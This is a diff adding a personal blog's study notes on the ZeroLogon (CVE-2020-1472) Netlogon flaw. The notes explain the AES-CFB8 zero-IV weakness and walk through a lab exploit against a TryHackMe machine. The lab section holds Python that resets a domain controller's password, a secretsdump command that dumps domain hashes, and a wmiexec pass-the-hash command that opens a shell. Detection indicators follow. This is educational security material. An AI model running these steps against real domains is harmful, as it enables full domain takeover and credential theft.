@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>ZeroLogon :: Vlaghe&#39;s Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="NetLogon Protocol  Overview  is an RPC interface (Windows domain controllers) used 4 user and machine authentication (e.g logging in to servers using NTLM, update password) available over TCP through a dynamic port set by the portmapper service OR through an SMB pipe on 445 it uses a customized cryptographic protocol to let a client (a domain-joined computer) and server (the domain controller) prove to each other that they both know a shared secret (i." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://vlaghe.github.io/notes/zerologon/" />
+
+
+
+
+<link rel="stylesheet" href="https://vlaghe.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://vlaghe.github.io/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://vlaghe.github.io/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://vlaghe.github.io/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="ZeroLogon">
+<meta property="og:description" content="NetLogon Protocol  Overview  is an RPC interface (Windows domain controllers) used 4 user and machine authentication (e.g logging in to servers using NTLM, update password) available over TCP through a dynamic port set by the portmapper service OR through an SMB pipe on 445 it uses a customized cryptographic protocol to let a client (a domain-joined computer) and server (the domain controller) prove to each other that they both know a shared secret (i." />
+<meta property="og:url" content="https://vlaghe.github.io/notes/zerologon/" />
+<meta property="og:site_name" content="Vlaghe&#39;s Blog" />
+
+  
+    <meta property="og:image" content="https://vlaghe.github.io/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-05-03 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Blog
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/notes">Notes</a></li>
+        
+      
+        
+          <li><a href="/writeups">Writeups</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/notes">Notes</a></li>
+      
+    
+      
+        <li><a href="/writeups">Writeups</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://vlaghe.github.io/notes/zerologon/">ZeroLogon</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-05-03
+        
+      </span>
+    
+    
+    
+  </div>
+
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h2 id="netlogon-protocol">NetLogon Protocol<a href="#netlogon-protocol" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<ul>
+<li><strong>Overview</strong>
+<ul>
+<li>is an RPC interface <em>(Windows domain controllers)</em></li>
+<li>used 4 user and machine authentication <em>(e.g logging in to servers using NTLM, update password)</em></li>
+<li>available over TCP through a dynamic port set by the <em>portmapper</em> service OR through an SMB pipe on <code>445</code></li>
+<li>it uses a customized cryptographic protocol to let a client <em>(a domain-joined computer)</em> and server <em>(the domain controller)</em> prove to each other that they both know a shared secret <em>(i.e hash of the client&rsquo;s account password)</em></li>
+</ul>
+</li>
+<li>initial auth handshake
+<ul>
+<li><img src="/img/auth_handshake_zerologon.png" alt=""></li>
+</ul>
+</li>
+</ul>
+<h2 id="aes-cfb8-insecure-use">AES-CFB8 insecure use<a href="#aes-cfb8-insecure-use" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<ul>
+<li>The cryptographic primitive both the client and server use to generate credential values is implemented in a function called <code>ComputeNetlogonCredential</code> <em>(takes an 8-byte input &amp; performs transformasion w the secret esssion key)</em></li>
+<li>To acomplish this it uses the <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#CFB">CFB8 (8-bit cypher feedback) mode</a>
+<ul>
+<li><img src="/img/aes_cfb8.png" alt=""></li>
+</ul>
+</li>
+<li>Instead of generating the Initialization Vector <em>(IV)</em> randomly, the <code>ComputeNetlogonCredential</code> function <strong>defines it as a fixed value which consits of 16 zero bytes</strong> =&gt; this violates the requirments for using AES-CFB8 securely</li>
+<li>Ok but what could go wrong? Well: <strong>for 1 in 256 keys, applying AESCFB8 encryption to an all-zero plaintext will result in all-zero ciphertext</strong>
+<ul>
+<li><img src="/img/aes_cfb8_broken.png" alt=""></li>
+</ul>
+</li>
+</ul>
+<h2 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p><img src="/img/exploit_zerologon.png" alt=""></p>
+<ol>
+<li>Spoofing the client credential
+<ul>
+<li>after exchanging challenges with a <code>NetrServerReqChallenge</code> call</li>
+<li>a client authenticates by doing a <code>NetrServerAuthenticate3</code> call, which has a parameter <code>ClientCredential</code> <em>(that is computed by applying the <code>ComputeNetlogonCredential</code> to the client challenge)</em></li>
+<li>because we have control over the client challenge there&rsquo;s nothing stopping us to set it to 8 zeroes =&gt; for 1 in 256 session keys, the correct <code>ClientCredential</code> will also consist of 8 zeroes</li>
+<li>session key will be different for every authentication attempt</li>
+<li>computer accounts are not locked after invalid login attempt =&gt; we can try a bunch of times until we hit a key &amp; authentication succeeds</li>
+</ul>
+</li>
+<li>Disabling signing &amp; sealing
+<ul>
+<li>ok we can bypass the auth call, but we still have no idea what the value of the session key is</li>
+<li>it becomess problematic due to Netlogon&rsquo;ss transport encryption mechanism <em>(RPC signing &amp; sealing)</em>, which uses this key but a different scheme than <code>ComputeNetlogonCredential</code></li>
+<li>luckily, signing &amp; sealing is optional =&gt; so we can simply omit the flag in the <code>NetrServerAuthenticate3</code> call &amp; continue</li>
+</ul>
+</li>
+<li>Spoofing a call
+<ul>
+<li>even when encryption is disabled, every call must contain a so-called <code>authenticator</code> value which is computed by applying <code>ComputeNetlogonCredential(w session key)</code> to the <code>ClientStoredCredential + Timestamp</code>
+<ul>
+<li><code>ClientStoredCredential</code>: incrementing value maintained by the client &amp; intialised to the same value as the <code>ClientCredential</code> we provided =&gt; will be 0</li>
+<li><code>Timestamp</code>: the current Posix time; server doesn&rsquo;t place many restriction on this value =&gt; simply pretend that it’s January 1st, 1970 = 0</li>
+</ul>
+</li>
+<li><code>ComputeNetlogonCredential(0) = 0</code> =&gt; we can authenticate our first call by simply providing an all-zero authenticator &amp; timestamp</li>
+</ul>
+</li>
+<li>Changing computer&rsquo;s AD password
+<ul>
+<li>we can leverage the <code>NetrServerPasswordSet2</code> call to set a new password for the client
+<ul>
+<li>password is not hashed but it is encrypted with the session key by using again <code>CFB8</code> with an all-zero IV</li>
+</ul>
+</li>
+<li>plaintext password structure in the Netlogon protocol consists of 516 bytes <em>(last 4 being the pass len)</em></li>
+<li>provide 516 zeroes =&gt; decryption to 516 zeroes =&gt; zero-length password <em>(setting empty passwords for a computer is not forbidden)</em> =&gt; can set an empty password for any computer in the domain</li>
+<li>afterwards, we can simply set up a new Netlogon connection on behalf of this computer</li>
+</ul>
+<blockquote>
+<p><strong>NOTE</strong>: When changing a computer password in this way it is only changed in the AD. The targeted system itself will still locally store its original password.</p>
+</blockquote>
+</li>
+<li>From pass change to domain admin</li>
+</ol>
+<h3 id="lab">Lab<a href="#lab" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<ul>
+<li><strong>Perequistes</strong>
+<ul>
+<li>check out the <a href="https://github.com/SecuraBV/CVE-2020-1472">POC released by secura</a></li>
+<li>install <a href="">impacket</a>:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m pip install virtualenv
+</span></span><span style="display:flex;"><span>python3 -m virtualenv impacketEnv  
+</span></span><span style="display:flex;"><span>source impacketEnv/bin/activate
+</span></span><span style="display:flex;"><span>pip install git+https://github.com/SecureAuthCorp/impacket
+</span></span></code></pre></div><pre tabindex="0"><code></code></pre></li>
+<li>setup a local Domain Name Controller <em>(<a href="https://tryhackme.com/room/zer0logon">THM zer0logon room</a>)</em></li>
+</ul>
+</li>
+<li>Modify <code>zerologon_tester.py</code> to reset the domain controller password &amp; run it: <code>python zerologon_tester.py DC01 10.10.45.187</code>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">build_new_pass_req</span>(dc_handle, target_computer):
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81</span>
+</span></span><span style="display:flex;"><span>newPassRequest <span style="color:#f92672">=</span> nrpc<span style="color:#f92672">.</span>NetrServerPasswordSet2()
+</span></span><span style="display:flex;"><span>newPassRequest[<span style="color:#e6db74">&#39;PrimaryName&#39;</span>] <span style="color:#f92672">=</span> dc_handle <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>newPassRequest[<span style="color:#e6db74">&#39;AccountName&#39;</span>] <span style="color:#f92672">=</span> target_computer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;$</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>newPassRequest[<span style="color:#e6db74">&#39;SecureChannelType&#39;</span>] <span style="color:#f92672">=</span> nrpc<span style="color:#f92672">.</span>NETLOGON_SECURE_CHANNEL_TYPE<span style="color:#f92672">.</span>ServerSecureChannel
+</span></span><span style="display:flex;"><span>newPassRequest[<span style="color:#e6db74">&#39;ComputerName&#39;</span>] <span style="color:#f92672">=</span> target_computer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/76c93227-942a-4687-ab9d-9d972ffabdab</span>
+</span></span><span style="display:flex;"><span>auth <span style="color:#f92672">=</span> nrpc<span style="color:#f92672">.</span>NETLOGON_AUTHENTICATOR()
+</span></span><span style="display:flex;"><span>auth[<span style="color:#e6db74">&#39;Credential&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>auth[<span style="color:#e6db74">&#39;Timestamp&#39;</span>]  <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>newPassRequest[<span style="color:#e6db74">&#39;Authenticator&#39;</span>] <span style="color:#f92672">=</span> auth
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># consists of 516 bytes of random padding: junk + password + length of pass (last 4 bytes)</span>
+</span></span><span style="display:flex;"><span>newPassRequest[<span style="color:#e6db74">&#39;ClearNewPassword&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">516</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> newPassRequest
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">try_zero_authenticate</span>(dc_handle, dc_ip, target_computer):
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># It worked!</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">assert</span> server_auth[<span style="color:#e6db74">&#39;ErrorCode&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>	server_auth<span style="color:#f92672">.</span>dump()
+</span></span><span style="display:flex;"><span>	print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;server challenge </span><span style="color:#e6db74">{</span>serverChall<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    	<span style="color:#75715e"># Trigger password reset</span>
+</span></span><span style="display:flex;"><span>    	print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Attempting password reset on </span><span style="color:#e6db74">{</span>target_computer<span style="color:#e6db74">}</span><span style="color:#e6db74">...&#34;</span>)
+</span></span><span style="display:flex;"><span>		newPassReq <span style="color:#f92672">=</span> build_new_pass_req(dc_handle, target_computer)
+</span></span><span style="display:flex;"><span>		res        <span style="color:#f92672">=</span> rpc_con<span style="color:#f92672">.</span>request(newPassReq)
+</span></span><span style="display:flex;"><span>		res<span style="color:#f92672">.</span>dump()
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>    	print(e)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> rpc_con
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span></code></pre></div><pre tabindex="0"><code></code></pre></li>
+<li>Dump hashes with <a href="https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/secretsdump.py">impacket&rsquo;s secretsdump.py</a>: <code>python secretsdump.py -just-dc HOLOLIVE/DC01\$@10.10.45.187</code></li>
+<li>Pop shell w <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py">wmiexec.py</a> by passing the hash: <code>python wmiexec.py HOLOLIVE/Administrator@10.10.45.187 -hashes aad3b435b51404eeaad3b435b51404ee:3f3ef89114fb063e3d7fc23c20f65568</code></li>
+</ul>
+<h2 id="packet-analysis">Packet Analysis<a href="#packet-analysis" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>TODO</p>
+<h2 id="mitigation--detection">Mitigation &amp; Detection<a href="#mitigation--detection" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<ul>
+<li>many tries to authenticate unssuccessfully</li>
+<li>zero key stream in auth netlogon pkgs</li>
+<li>ssign &amp; sseal flags are disabled</li>
+<li>timesstamp in auth value is 0</li>
+<li>choosing cipher suite of AES-CFB8</li>
+</ul>
+<p>wirehark rule to detect it <em>(based on timestamp, negotiation opts, challenge &amp; iv?)</em></p>
+<hr>
+<h2 id="references">References<a href="#references" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<ul>
+<li><a href="https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/">Zerologon (CVE-2020-1472): An Unauthenticated Privilege Escalation to Full Domain Privileges</a></li>
+<li><a href="https://www.youtube.com/watch?v=EzVmGQr2IFw">Zerologon Attack Explained Technical - CVE-2020-1472</a></li>
+<li><a href="https://www.secura.com/uploads/whitepapers/Zerologon.pdf">Whitepaper: secura</a></li>
+</ul>
+
+      </div></div>
+
+  
+
+  
+  
+
+  
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://vlaghe.github.io/assets/main.js"></script>
+<script src="https://vlaghe.github.io/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
